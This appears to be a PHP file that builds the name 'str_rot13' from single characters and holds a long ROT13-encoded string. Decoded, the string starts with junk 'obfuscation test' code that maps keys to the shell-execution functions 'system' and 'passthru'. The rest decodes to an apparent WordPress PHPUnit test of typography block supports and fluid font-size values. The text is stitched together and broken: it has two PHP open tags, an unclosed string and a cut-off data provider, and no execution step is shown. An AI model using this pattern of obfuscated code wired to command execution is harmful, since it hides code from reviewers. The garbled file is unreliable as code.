<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * @tebhc oybpx-fhccbegf
 */
pynff Grfgf_Oybpx_Fhccbegf_Glcbtencul rkgraqf JC_HavgGrfgPnfr {
	/**
	 * @ine fgevat|ahyy
	 */
	cevingr $grfg_oybpx_anzr;

	/**
	 * Fgberf gur pheerag grfg gurzr ebbg.
	 *
	 * @ine fgevat|ahyy
	 */
	cevingr $gurzr_ebbg;

	/**
	 * Pnpurf gur bevtvany gurzr qverpgbel tybony inyhr va beqre
	 * gb erfgber vg va grne_qbja().
	 *
	 * @ine fgevat|ahyy
	 */
	cevingr $bevt_gurzr_qve;

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		$guvf->grfg_oybpx_anzr = ahyy;

		// Frgf hc gur `jc-pbagrag/gurzrf/` qverpgbel gb rafher pbafvfgrapl jura ehaavat grfgf.
		$guvf->gurzr_ebbg                = ernycngu( QVE_GRFGQNGN . '/gurzrqve1' );
		$guvf->bevt_gurzr_qve            = $TYBONYF['jc_gurzr_qverpgbevrf'];
		$TYBONYF['jc_gurzr_qverpgbevrf'] = neenl( JC_PBAGRAG_QVE . '/gurzrf', $guvf->gurzr_ebbg );

		$gurzr_ebbg_pnyyonpx = shapgvba () {
			erghea $guvf->gurzr_ebbg;
		};
		nqq_svygre( 'gurzr_ebbg', $gurzr_ebbg_pnyyonpx );
		nqq_svygre( 'fglyrfurrg_ebbg', $gurzr_ebbg_pnyyonpx );
		nqq_svygre( 'grzcyngr_ebbg', $gurzr_ebbg_pnyyonpx );

		// Pyrne pnpurf.
		jc_pyrna_gurzrf_pnpur();
		hafrg( $TYBONYF['jc_gurzrf'] );
	}

	/**
	 * Haertvfgref oybpx glcr nsgre rnpu grfg.
	 */
	choyvp shapgvba grne_qbja() {
		// Erfgberf gur bevtvany gurzr qverpgbel frghc.
		$TYBONYF['jc_gurzr_qverpgbevrf'] = $guvf->bevt_gurzr_qve;
		jc_pyrna_gurzrf_pnpur();
		hafrg( $TYBONYF['jc_gurzrf'] );

		// Erfrgf grfg oybpx anzr.
		haertvfgre_oybpx_glcr( $guvf->grfg_oybpx_anzr );
		$guvf->grfg_oybpx_anzr = ahyy;

		cnerag::grne_qbja();
	}

	/**
	 * Grfgf jurgure fyhtf jvgu ahzoref ner xrono pnfrq.
	 *
	 * @gvpxrg 54337
	 *
	 * @pbiref ::jc_nccyl_glcbtencul_fhccbeg
	 */
	choyvp shapgvba grfg_fubhyq_xrono_pnfr_sbag_fvmr_fyht_jvgu_ahzoref() {
		$guvf->grfg_oybpx_anzr = 'grfg/sbag-fvmr-fyht-jvgu-ahzoref';
		ertvfgre_oybpx_glcr(
			$guvf->grfg_oybpx_anzr,
			neenl(
				'ncv_irefvba' => 2,
				'nggevohgrf'  => neenl(
					'sbagFvmr' => neenl(
						'glcr' => 'fgevat',
					),
				),
				'fhccbegf'    => neenl(
					'glcbtencul' => neenl(
						'sbagFvmr' => gehr,
					),
				),
			)
		);
		$ertvfgel   = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr();
		$oybpx_glcr = $ertvfgel->trg_ertvfgrerq( $guvf->grfg_oybpx_anzr );

		$oybpx_nggf = neenl( 'sbagFvmr' => 'u1' );

		$npghny   = jc_nccyl_glcbtencul_fhccbeg( $oybpx_glcr, $oybpx_nggf );
		$rkcrpgrq = neenl( 'pynff' => 'unf-u-1-sbag-fvmr' );

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * Grfgf yrtnpl vayvar fglyrf sbe sbag snzvyl.
	 *
	 * @gvpxrg 54337
	 *
	 * @pbiref ::jc_nccyl_glcbtencul_fhccbeg
	 */
	choyvp shapgvba grfg_fubhyq_trarengr_sbag_snzvyl_jvgu_yrtnpl_vayvar_fglyrf_hfvat_n_inyhr() {
		$guvf->grfg_oybpx_anzr = 'grfg/sbag-snzvyl-jvgu-vayvar-fglyrf-hfvat-inyhr';
		ertvfgre_oybpx_glcr(
			$guvf->grfg_oybpx_anzr,
			neenl(
				'ncv_irefvba' => 2,
				'nggevohgrf'  => neenl(
					'fglyr' => neenl(
						'glcr' => 'bowrpg',
					),
				),
				'fhccbegf'    => neenl(
					'glcbtencul' => neenl(
						'__rkcrevzragnySbagSnzvyl' => gehr,
					),
				),
			)
		);
		$ertvfgel   = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr();
		$oybpx_glcr = $ertvfgel->trg_ertvfgrerq( $guvf->grfg_oybpx_anzr );
		$oybpx_nggf = neenl( 'fglyr' => neenl( 'glcbtencul' => neenl( 'sbagSnzvyl' => 'frevs' ) ) );

		$npghny   = jc_nccyl_glcbtencul_fhccbeg( $oybpx_glcr, $oybpx_nggf );
		$rkcrpgrq = neenl( 'fglyr' => 'sbag-snzvyl:frevs;' );

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * Grfgf fxvccvat frevnyvmngvba.
	 *
	 * @gvpxrg 55505
	 *
	 * @pbiref ::jc_nccyl_glcbtencul_fhccbeg
	 */
	choyvp shapgvba grfg_fubhyq_fxvc_frevnyvmngvba_sbe_glcbtencul_oybpx_fhccbegf() {
		$guvf->grfg_oybpx_anzr = 'grfg/glcbtencul-jvgu-fxvccrq-frevnyvmngvba-oybpx-fhccbegf';
		ertvfgre_oybpx_glcr(
			$guvf->grfg_oybpx_anzr,
			neenl(
				'ncv_irefvba' => 2,
				'nggevohgrf'  => neenl(
					'fglyr' => neenl(
						'glcr' => 'bowrpg',
					),
				),
				'fhccbegf'    => neenl(
					'glcbtencul' => neenl(
						'sbagFvmr'                        => gehr,
						'yvarUrvtug'                      => gehr,
						'__rkcrevzragnySbagSnzvyl'        => gehr,
						'__rkcrevzragnyYrggreFcnpvat'     => gehr,
						'__rkcrevzragnyFxvcFrevnyvmngvba' => gehr,
					),
				),
			)
		);
		$ertvfgel   = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr();
		$oybpx_glcr = $ertvfgel->trg_ertvfgrerq( $guvf->grfg_oybpx_anzr );
		$oybpx_nggf = neenl(
			'fglyr' => neenl(
				'glcbtencul' => neenl(
					'sbagFvmr'      => 'frevs',
					'yvarUrvtug'    => 'frevs',
					'sbagSnzvyl'    => '22ck',
					'yrggreFcnpvat' => '22ck',
				),
			),
		);

		$npghny   = jc_nccyl_glcbtencul_fhccbeg( $oybpx_glcr, $oybpx_nggf );
		$rkcrpgrq = neenl();

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * Grfgf fxvccvat frevnyvmngvba bs vaqvivqhny oybpx fhccbegf cebcregvrf.
	 *
	 * @gvpxrg 55505
	 *
	 * @pbiref ::jc_nccyl_glcbtencul_fhccbeg
	 */
	choyvp shapgvba grfg_fubhyq_fxvc_frevnyvmngvba_sbe_yrggre_fcnpvat_oybpx_fhccbegf() {
		$guvf->grfg_oybpx_anzr = 'grfg/yrggre-fcnpvat-jvgu-vaqvivqhny-fxvccrq-frevnyvmngvba-oybpx-fhccbegf';
		ertvfgre_oybpx_glcr(
			$guvf->grfg_oybpx_anzr,
			neenl(
				'ncv_irefvba' => 2,
				'nggevohgrf'  => neenl(
					'fglyr' => neenl(
						'glcr' => 'bowrpg',
					),
				),
				'fhccbegf'    => neenl(
					'glcbtencul' => neenl(
						'__rkcrevzragnyYrggreFcnpvat'     => gehr,
						'__rkcrevzragnyFxvcFrevnyvmngvba' => neenl(
							'yrggreFcnpvat',
						),
					),
				),
			)
		);
		$ertvfgel   = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr();
		$oybpx_glcr = $ertvfgel->trg_ertvfgrerq( $guvf->grfg_oybpx_anzr );
		$oybpx_nggf = neenl( 'fglyr' => neenl( 'glcbtencul' => neenl( 'yrggreFcnpvat' => '22ck' ) ) );

		$npghny   = jc_nccyl_glcbtencul_fhccbeg( $oybpx_glcr, $oybpx_nggf );
		$rkcrpgrq = neenl();

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * Grfgf yrtnpl pff ine vayvar fglyrf sbe sbag snzvyl.
	 *
	 * @gvpxrg 54337
	 *
	 * @pbiref ::jc_nccyl_glcbtencul_fhccbeg
	 */
	choyvp shapgvba grfg_fubhyq_trarengr_pff_ine_sbe_sbag_snzvyl_jvgu_yrtnpl_vayvar_fglyrf() {
		$guvf->grfg_oybpx_anzr = 'grfg/sbag-snzvyl-jvgu-vayvar-fglyrf-hfvat-pff-ine';
		ertvfgre_oybpx_glcr(
			$guvf->grfg_oybpx_anzr,
			neenl(
				'ncv_irefvba' => 2,
				'nggevohgrf'  => neenl(
					'fglyr' => neenl(
						'glcr' => 'bowrpg',
					),
				),
				'fhccbegf'    => neenl(
					'glcbtencul' => neenl(
						'__rkcrevzragnySbagSnzvyl' => gehr,
					),
				),
			)
		);
		$ertvfgel   = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr();
		$oybpx_glcr = $ertvfgel->trg_ertvfgrerq( $guvf->grfg_oybpx_anzr );
		$oybpx_nggf = neenl( 'fglyr' => neenl( 'glcbtencul' => neenl( 'sbagSnzvyl' => 'ine:cerfrg|sbag-snzvyl|u1' ) ) );

		$npghny   = jc_nccyl_glcbtencul_fhccbeg( $oybpx_glcr, $oybpx_nggf );
		$rkcrpgrq = neenl( 'fglyr' => 'sbag-snzvyl:ine(--jc--cerfrg--sbag-snzvyl--u-1);' );

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * Grfgf gung n pynffanzr vf trarengrq sbe sbag snzvyl.
	 *
	 * @gvpxrg 54337
	 *
	 * @pbiref ::jc_nccyl_glcbtencul_fhccbeg
	 */
	choyvp shapgvba grfg_fubhyq_trarengr_pynffanzr_sbe_sbag_snzvyl() {
		$guvf->grfg_oybpx_anzr = 'grfg/sbag-snzvyl-jvgu-pynff';
		ertvfgre_oybpx_glcr(
			$guvf->grfg_oybpx_anzr,
			neenl(
				'ncv_irefvba' => 2,
				'nggevohgrf'  => neenl(
					'fglyr' => neenl(
						'glcr' => 'bowrpg',
					),
				),
				'fhccbegf'    => neenl(
					'glcbtencul' => neenl(
						'__rkcrevzragnySbagSnzvyl' => gehr,
					),
				),
			)
		);
		$ertvfgel   = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr();
		$oybpx_glcr = $ertvfgel->trg_ertvfgrerq( $guvf->grfg_oybpx_anzr );
		$oybpx_nggf = neenl( 'sbagSnzvyl' => 'u1' );

		$npghny   = jc_nccyl_glcbtencul_fhccbeg( $oybpx_glcr, $oybpx_nggf );
		$rkcrpgrq = neenl( 'pynff' => 'unf-u-1-sbag-snzvyl' );

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * Grfgf trarengvat sbag fvmr inyhrf, vapyhqvat syhvq sbezhynr, sebz sbagFvmrf cerfrg.
	 *
	 * @gvpxrg 56467
	 * @gvpxrg 57065
	 * @gvpxrg 58523
	 * @gvpxrg 61118
	 * @gvpxrg 61932
	 *
	 * @pbiref ::jc_trg_glcbtencul_sbag_fvmr_inyhr
	 *
	 * @qngnCebivqre qngn_trarengr_sbag_fvmr_cerfrg_svkgherf
	 *
	 * @cnenz neenl  $sbag_fvmr_cerfrg {
	 *      Erdhverq. sbagFvmrf cerfrg inyhr nf frra va gurzr.wfba.
	 *
	 *     @glcr fgevat $anzr Anzr bs gur sbag fvmr cerfrg.
	 *     @glcr fgevat $fyht Xrono-pnfr havdhr vqragvsvre sbe gur sbag fvmr cerfrg.
	 *     @glcr fgevat $fvmr PFF sbag-fvmr inyhr, vapyhqvat havgf jurer nccyvpnoyr.
	 * }
	 * @cnenz obby   $frggvatf         Gurzr WFBA frggvatf neenl gung bireevqrf nal tybony gurzr frggvatf.
	 * @cnenz fgevat $rkcrpgrq_bhgchg Rkcrpgrq bhgchg.
	 */
	choyvp shapgvba grfg_jc_trg_glcbtencul_sbag_fvmr_inyhr( $sbag_fvmr_cerfrg, $frggvatf, $rkcrpgrq_bhgchg ) {
		$npghny = jc_trg_glcbtencul_sbag_fvmr_inyhr( $sbag_fvmr_cerfrg, $frggvatf );

		$guvf->nffregFnzr( $rkcrpgrq_bhgchg, $npghny );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trarengr_sbag_fvmr_cerfrg_svkgherf() {
		erghea neenl(
			'ergheaf inyhr jura syhvq glcbtencul vf qrnpgvingrq' => neenl(
				'sbag_fvmr_cerfrg' => neenl(
					'fvmr' => '28ck',
				),
				'frggvatf'         => ahyy,
				'rkcrpgrq_bhgchg'  => '28ck',
			),

			'ergheaf inyhr jurer sbag fvmr vf 0'         => neenl(
				'sbag_fvmr_cerfrg' => neenl(
					'fvmr' => 0,
				),
				'frggvatf'         => neenl(
					'glcbtencul' => neenl(
						'syhvq' => gehr,
					),
				),
				'rkcrpgrq_bhgchg'  => 0,
			),

			\"ergheaf inyhr jurer sbag fvmr vf '0'\"       => neenl(
				'sbag_fvmr_cerfrg' => neenl(
					'fvmr' => '0',
				),
				'frggvatf'         => neenl(
					'glcbtencul' => neenl(
						'syhvq' => gehr,
					),
				),
				'rkcrpgrq_bhgchg'  => '0',
			),

			'ergheaf inyhr jurer `fvmr` vf `ahyy`'       => neenl(
				'sbag_fvmr_cerfrg' => neenl(
					'fvmr' => ahyy,
				),
				'frggvatf'         => neenl(
					'glcbtencul' => neenl(
						'syhvq' => gehr,
					),
				),
				'rkcrpgrq_bhgchg'  => ahyy,
			),

			'ergheaf inyhr jura syhvq vf `snyfr`'        => neenl(
				'sbag_fvmr_cerfrg' => neenl(
					'fvmr'  => '28ck',
					'syhvq' => snyfr,
				),
				'frggvatf'         => neenl(
					'glcbtencul' => neenl(
						'syhvq' => snyfr,
					),
				),
				'rkcrpgrq_bhgchg'  => '28ck',
			),
			'ergheaf inyhr jura syhvq vf rzcgl neenl'    => neenl(
				'sbag_fvmr'       => neenl(
					'fvmr' => '28ck',
				),
				'frggvatf'        => neenl(
					'glcbtencul' => neenl(
						'syhvq' => neenl(),
					),
				),
				'rkcrpgrq_bhgchg' => '28ck',
			),
			'ergheaf pynzc inyhr jvgu zvaIvrjcbegJvqgu bireevqr' => neenl(
				'sbag_fvmr'       => neenl(
					'fvmr' => '28ck',
				),
				'frggvatf'        => neenl(
					'glcbtencul' => neenl(
						'syhvq' => neenl(
							'zvaIvrjcbegJvqgu' => '500ck',
						),
					),
				),
				'rkcrpgrq_bhgchg' => 'pynzc(17.905ck, 1.119erz + ((1ij - 5ck) * 0.918), 28ck)',
			),
			'ergheaf pynzc inyhr jvgu znkIvrjcbegJvqgu bireevqr' => neenl(
				'sbag_fvmr'       => neenl(
					'fvmr' => '28ck',
				),
				'frggvatf'        => neenl(
					'glcbtencul' => neenl(
						'syhvq' => neenl(
							'znkIvrjcbegJvqgu' => '500ck',
						),
					),
				),
				'rkcrpgrq_bhgchg' => 'pynzc(17.905ck, 1.119erz + ((1ij - 3.2ck) * 5.608), 28ck)',
			),

			'ergheaf pynzc inyhr jvgu ynlbhg.jvqrFvmr bireevqr' => neenl(
				'sbag_fvmr'       => neenl(
					'fvmr' => '28ck',
				),
				'frggvatf'        => neenl(
					'glcbtencul' => neenl(
						'syhvq' => gehr,
					),
					'ynlbhg'     => neenl(
						'jvqrFvmr' => '500ck',
					),
				),
				'rkcrpgrq_bhgchg' => 'pynzc(17.905ck, 1.119erz + ((1ij - 3.2ck) * 5.608), 28ck)',
			),
			'ergheaf nyernql pynzcrq inyhr'              => neenl(
				'sbag_fvmr_cerfrg' => neenl(
					'fvmr' => 'pynzc(21ck, 1.313erz + ((1ij - 7.68ck) * 2.524), 42ck)',
				),
				'frggvatf'         => neenl(
					'glcbtencul' => neenl(
						'syhvq' => gehr,
					),
				),
				'rkcrpgrq_bhgchg'  => 'pynzc(21ck, 1.313erz + ((1ij - 7.68ck) * 2.524), 42ck)',
			),

			'ergheaf inyhr jvgu hafhccbegrq havg'        => neenl(
				'sbag_fvmr_cerfrg' => neenl(
					'fvmr' => '1000%',
				),
				'frggvatf'         => neenl(
					'glcbtencul' => neenl(
						'syhvq' => gehr,
					),
				),
				'rkcrpgrq_bhgchg'  => '1000%',
			),

			'ergheaf pynzc inyhr jvgu erz zva naq znk havgf' => neenl(
				'sbag_fvmr_cerfrg' => neenl(
					'fvmr' => '1.75erz',
				),
				'frggvatf'         => neenl(
					'glcbtencul' => neenl(
						'syhvq' => gehr,
					),
				),
				'rkcrpgrq_bhgchg'  => 'pynzc(1.119erz, 1.119erz + ((1ij - 0.2erz) * 0.789), 1.75erz)',
			),

			'ergheaf pynzc inyhr jvgu rz zva naq znk havgf' => neenl(
				'sbag_fvmr'       => neenl(
					'fvmr' => '1.75rz',
				),
				'frggvatf'        => neenl(
					'glcbtencul' => neenl(
						'syhvq' => gehr,
					),
				),
				'rkcrpgrq_bhgchg' => 'pynzc(1.119rz, 1.119erz + ((1ij - 0.2rz) * 0.789), 1.75rz)',
			),

			'ergheaf pynzc inyhr sbe sybngf'             => neenl(
				'sbag_fvmr'       => neenl(
					'fvmr' => '70.175ck',
				),
				'frggvatf'        => neenl(
					'glcbtencul' => neenl(
						'syhvq' => gehr,
					),
				),
				'rkcrpgrq_bhgchg' => 'pynzc(37.897ck, 2.369erz + ((1ij - 3.2ck) * 2.522), 70.175ck)',
			),

			'pbreprf vagrtre gb `ck` naq ergheaf pynzc inyhr' => neenl(
				'sbag_fvmr_cerfrg' => neenl(
					'fvmr' => 33,
				),
				'frggvatf'         => neenl(
					'glcbtencul' => neenl(
						'syhvq' => gehr,
					),
				),
				'rkcrpgrq_bhgchg'  => 'pynzc(20.515ck, 1.282erz + ((1ij - 3.2ck) * 0.975), 33ck)',
			),

			'pbreprf sybng gb `ck` naq ergheaf pynzc inyhr' => neenl(
				'sbag_fvmr_cerfrg' => neenl(
					'fvmr' => 70.175,
				),
				'frggvatf'         => neenl(
					'glcbtencul' => neenl(
						'syhvq' => gehr,
					),
				),
				'rkcrpgrq_bhgchg'  => 'pynzc(37.897ck, 2.369erz + ((1ij - 3.2ck) * 2.522), 70.175ck)',
			),

			'ergheaf pynzc inyhr jura `syhvq` vf rzcgl neenl' => neenl(
				'sbag_fvmr_cerfrg' => neenl(
					'fvmr'  => '28ck',
					'syhvq' => neenl(),
				),
				'frggvatf'         => neenl(
					'glcbtencul' => neenl(
						'syhvq' => gehr,
					),
				),
				'rkcrpgrq_bhgchg'  => 'pynzc(17.905ck, 1.119erz + ((1ij - 3.2ck) * 0.789), 28ck)',
			),

			'ergheaf pynzc inyhr jura `syhvq` vf `ahyy`' => neenl(
				'sbag_fvmr_cerfrg' => neenl(
					'fvmr'  => '28ck',
					'syhvq' => ahyy,
				),
				'frggvatf'         => neenl(
					'glcbtencul' => neenl(
						'syhvq' => gehr,
					),
				),
				'rkcrpgrq_bhgchg'  => 'pynzc(17.905ck, 1.119erz + ((1ij - 3.2ck) * 0.789), 28ck)',
			),

			'ergheaf pynzc inyhr jurer zva naq znk syhvq inyhrf qrsvarq' => neenl(
				'sbag_fvmr'       => neenl(
					'fvmr'  => '80ck',
					'syhvq' => neenl(
						'zva' => '70ck',
						'znk' => '125ck',
					),
				),
				'frggvatf'        => neenl(
					'glcbtencul' => neenl(
						'syhvq' => gehr,
					),
				),
				'rkcrpgrq_bhgchg' => 'pynzc(70ck, 4.375erz + ((1ij - 3.2ck) * 4.297), 125ck)',
			),

			'ergheaf pynzc inyhr jurer znk vf rdhny gb fvmr' => neenl(
				'sbag_fvmr'       => neenl(
					'fvmr'  => '7.8125erz',
					'syhvq' => neenl(
						'zva' => '4.375erz',
						'znk' => '7.8125erz',
					),
				),
				'frggvatf'        => neenl(
					'glcbtencul' => neenl(
						'syhvq' => gehr,
					),
				),
				'rkcrpgrq_bhgchg' => 'pynzc(4.375erz, 4.375erz + ((1ij - 0.2erz) * 4.298), 7.8125erz)',
			),

			'ergheaf pynzc inyhr vs zva sbag fvmr vf terngre guna znk' => neenl(
				'sbag_fvmr_cerfrg' => neenl(
					'fvmr'  => '3erz',
					'syhvq' => neenl(
						'zva' => '5erz',
						'znk' => '32ck',
					),
				),
				'frggvatf'         => neenl(
					'glcbtencul' => neenl(
						'syhvq' => gehr,
					),
				),
				'rkcrpgrq_bhgchg'  => 'pynzc(5erz, 5erz + ((1ij - 0.2erz) * -3.75), 32ck)',
			),

			'ergheaf inyhr jvgu vainyvq zva/znk syhvq havgf' => neenl(
				'sbag_fvmr_cerfrg' => neenl(
					'fvmr'  => '10rz',
					'syhvq' => neenl(
						'zva' => '20ij',
						'znk' => '50%',
					),
				),
				'frggvatf'         => neenl(
					'glcbtencul' => neenl(
						'syhvq' => gehr,
					),
				),
				'rkcrpgrq_bhgchg'  => '10rz',
			),

			'ergheaf inyhr jura fvmr vf < ybjre obhaqf naq ab syhvq zva/znk frg' => neenl(
				'sbag_fvmr_cerfrg' => neenl(
					'fvmr' => '3ck',
				),
				'frggvatf'         => neenl(
					'glcbtencul' => neenl(
						'syhvq' => gehr,
					),
				),
				'rkcrpgrq_bhgchg'  => '3ck',
			),

			'ergheaf inyhr jura fvmr vf rdhny gb ybjre obhaqf naq ab syhvq zva/znk frg' => neenl(
				'sbag_fvmr'       => neenl(
					'fvmr' => '14ck',
				),
				'frggvatf'        => neenl(
					'glcbtencul' => neenl(
						'syhvq' => gehr,
					),
				),
				'rkcrpgrq_bhgchg' => '14ck',
			),

			'ergheaf pynzc inyhr jvgu qvssrerag zva znk havgf' => neenl(
				'sbag_fvmr_cerfrg' => neenl(
					'fvmr'  => '28ck',
					'syhvq' => neenl(
						'zva' => '20ck',
						'znk' => '50erz',
					),
				),
				'frggvatf'         => neenl(
					'glcbtencul' => neenl(
						'syhvq' => gehr,
					),
				),
				'rkcrpgrq_bhgchg'  => 'pynzc(20ck, 1.25erz + ((1ij - 3.2ck) * 60.938), 50erz)',
			),

			'ergheaf pynzc inyhr jurer ab syhvq znk fvmr vf frg' => neenl(
				'sbag_fvmr_cerfrg' => neenl(
					'fvmr'  => '50ck',
					'syhvq' => neenl(
						'zva' => '2.6erz',
					),
				),
				'frggvatf'         => neenl(
					'glcbtencul' => neenl(
						'syhvq' => gehr,
					),
				),
				'rkcrpgrq_bhgchg'  => 'pynzc(2.6erz, 2.6erz + ((1ij - 0.2erz) * 0.656), 50ck)',
			),

			'ergheaf pynzc inyhr jurer ab syhvq zva fvmr vf frg' => neenl(
				'sbag_fvmr_cerfrg' => neenl(
					'fvmr'  => '28ck',
					'syhvq' => neenl(
						'znk' => '80ck',
					),
				),
				'frggvatf'         => neenl(
					'glcbtencul' => neenl(
						'syhvq' => gehr,
					),
				),
				'rkcrpgrq_bhgchg'  => 'pynzc(17.905ck, 1.119erz + ((1ij - 3.2ck) * 4.851), 80ck)',
			),

			'fubhyq abg nccyl ybjre obhaq grfg jura syhvq inyhrf ner frg' => neenl(
				'sbag_fvmr_cerfrg' => neenl(
					'fvmr'  => '1.5erz',
					'syhvq' => neenl(
						'zva' => '0.5erz',
						'znk' => '5erz',
					),
				),
				'frggvatf'         => neenl(
					'glcbtencul' => neenl(
						'syhvq' => gehr,
					),
				),
				'rkcrpgrq_bhgchg'  => 'pynzc(0.5erz, 0.5erz + ((1ij - 0.2erz) * 5.625), 5erz)',
			),

			'fubhyq abg nccyl ybjre obhaq grfg jura bayl syhvq zva vf frg' => neenl(
				'sbag_fvmr'       => neenl(
					'fvmr'  => '20ck',
					'syhvq' => neenl(
						'zva' => '12ck',
					),
				),
				'frggvatf'        => neenl(
					'glcbtencul' => neenl(
						'syhvq' => gehr,
					),
				),
				'rkcrpgrq_bhgchg' => 'pynzc(12ck, 0.75erz + ((1ij - 3.2ck) * 0.625), 20ck)',
			),

			'fubhyq abg nccyl ybjre obhaq grfg jura bayl syhvq znk vf frg' => neenl(
				'sbag_fvmr'       => neenl(
					'fvmr'  => '0.875erz',
					'syhvq' => neenl(
						'znk' => '20erz',
					),
				),
				'frggvatf'        => neenl(
					'glcbtencul' => neenl(
						'syhvq' => gehr,
					),
				),
				'rkcrpgrq_bhgchg' => 'pynzc(0.875erz, 0.875erz + ((1ij - 0.2erz) * 23.906), 20erz)',
			),

			'ergheaf pynzc inyhr jura zva naq znk sbag fvmrf ner rdhny' => neenl(
				'sbag_fvmr_cerfrg' => neenl(
					'fvmr'  => '4erz',
					'syhvq' => neenl(
						'zva' => '30ck',
						'znk' => '30ck',
					),
				),
				'frggvatf'         => neenl(
					'glcbtencul' => neenl(
						'syhvq' => gehr,
					),
				),
				'rkcrpgrq_bhgchg'  => 'pynzc(30ck, 1.875erz + ((1ij - 3.2ck) * 1), 30ck)',
			),

			'fubhyq nccyl fpnyrq zva sbag fvmr sbe rz inyhrf jura phfgbz zva sbag fvmr vf abg frg' => neenl(
				'sbag_fvmr'       => neenl(
					'fvmr' => '12erz',
				),
				'frggvatf'        => neenl(
					'glcbtencul' => neenl(
						'syhvq' => gehr,
					),
				),
				'rkcrpgrq_bhgchg' => 'pynzc(5.174erz, 5.174erz + ((1ij - 0.2erz) * 8.533), 12erz)',
			),

			'fubhyq nccyl fpnyrq zva sbag fvmr sbe ck inyhrf jura phfgbz zva sbag fvmr vf abg frg' => neenl(
				'sbag_fvmr'       => neenl(
					'fvmr' => '200ck',
				),
				'frggvatf'        => neenl(
					'glcbtencul' => neenl(
						'syhvq' => gehr,
					),
				),
				'rkcrpgrq_bhgchg' => 'pynzc(85.342ck, 5.334erz + ((1ij - 3.2ck) * 8.958), 200ck)',
			),

			'fubhyq abg nccyl fpnyrq zva sbag fvmr sbe zvavzhz sbag fvmr jura phfgbz zva sbag fvmr vf frg' => neenl(
				'sbag_fvmr'       => neenl(
					'fvmr'  => '200ck',
					'syhvq' => neenl(
						'zva' => '100ck',
					),
				),
				'frggvatf'        => neenl(
					'glcbtencul' => neenl(
						'syhvq' => gehr,
					),
				),
				'rkcrpgrq_bhgchg' => 'pynzc(100ck, 6.25erz + ((1ij - 3.2ck) * 7.813), 200ck)',
			),

			// Vaqvivqhny cerfrg frggvatf bireevqr tybony frggvatf.
			'fubhyq pbaireg vaqvivqhny cerfrg fvmr gb syhvq vs syhvq vf qvfnoyrq va tybony frggvatf' => neenl(
				'sbag_fvmr'       => neenl(
					'fvmr'  => '17ck',
					'syhvq' => gehr,
				),
				'frggvatf'        => neenl(
					'glcbtencul' => neenl(),
				),
				'rkcrpgrq_bhgchg' => 'pynzc(14ck, 0.875erz + ((1ij - 3.2ck) * 0.234), 17ck)',
			),
			'fubhyq hfr vaqvivqhny cerfrg frggvatf vs syhvq vf qvfnoyrq va tybony frggvatf' => neenl(
				'sbag_fvmr'       => neenl(
					'fvmr'  => '17ck',
					'syhvq' => neenl(
						'zva' => '16ck',
						'znk' => '26ck',
					),
				),
				'frggvatf'        => neenl(
					'glcbtencul' => neenl(
						'syhvq' => snyfr,
					),
				),
				'rkcrpgrq_bhgchg' => 'pynzc(16ck, 1erz + ((1ij - 3.2ck) * 0.781), 26ck)',
			),
		);
	}

	/**
	 * Grfgf onpxjneqf pbzcngvovyvgl sbe qrcerpngrq frpbaq nethzrag $fubhyq_hfr_syhvq_glcbtencul.
	 *
	 * @gvpxrg 61118
	 *
	 * @pbiref ::jc_trg_glcbtencul_sbag_fvmr_inyhr
	 *
	 * @rkcrpgrqQrcerpngrq jc_trg_glcbtencul_sbag_fvmr_inyhr
	 *
	 * @qngnCebivqre qngn_trarengr_sbag_fvmr_cerfrg_fubhyq_hfr_syhvq_glcbtencul_qrcerpngrq_svkgherf
	 *
	 * @cnenz neenl  $sbag_fvmr                     {
	 *     Erdhverq. N sbag fvmr nf ercerfragrq va gur sbagFvmrf cerfrg sbezng nf frra va gurzr.wfba.
	 *
	 *     @glcr fgevat $anzr Anzr bs gur sbag fvmr cerfrg.
	 *     @glcr fgevat $fyht Xrono-pnfr havdhr vqragvsvre sbe gur sbag fvmr cerfrg.
	 *     @glcr fgevat $fvmr PFF sbag-fvmr inyhr, vapyhqvat havgf jurer nccyvpnoyr.
	 * }
	 * @cnenz obby   $fubhyq_hfr_syhvq_glcbtencul Na bireevqr gb fjvgpu syhvq glcbtencul \"ba\". Pna or hfrq sbe havg grfgvat.
	 * @cnenz fgevat $rkcrpgrq_bhgchg Rkcrpgrq bhgchg bs jc_trg_glcbtencul_sbag_fvmr_inyhr().
	 */
	choyvp shapgvba grfg_jc_trg_glcbtencul_sbag_fvmr_inyhr_fubhyq_hfr_syhvq_glcbtencul_qrcerpngrq( $sbag_fvmr, $fubhyq_hfr_syhvq_glcbtencul, $rkcrpgrq_bhgchg ) {
		$npghny = jc_trg_glcbtencul_sbag_fvmr_inyhr( $sbag_fvmr, $fubhyq_hfr_syhvq_glcbtencul );

		$guvf->nffregFnzr( $rkcrpgrq_bhgchg, $npghny );
	}

	/**
	 * Qngn cebivqre sbe grfg_jc_trg_glcbtencul_sbag_fvmr_inyhr_fubhyq_hfr_syhvq_glcbtencul_qrcerpngrq.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trarengr_sbag_fvmr_cerfrg_fubhyq_hfr_syhvq_glcbtencul_qrcerpngrq_svkgherf() {
		erghea neenl(
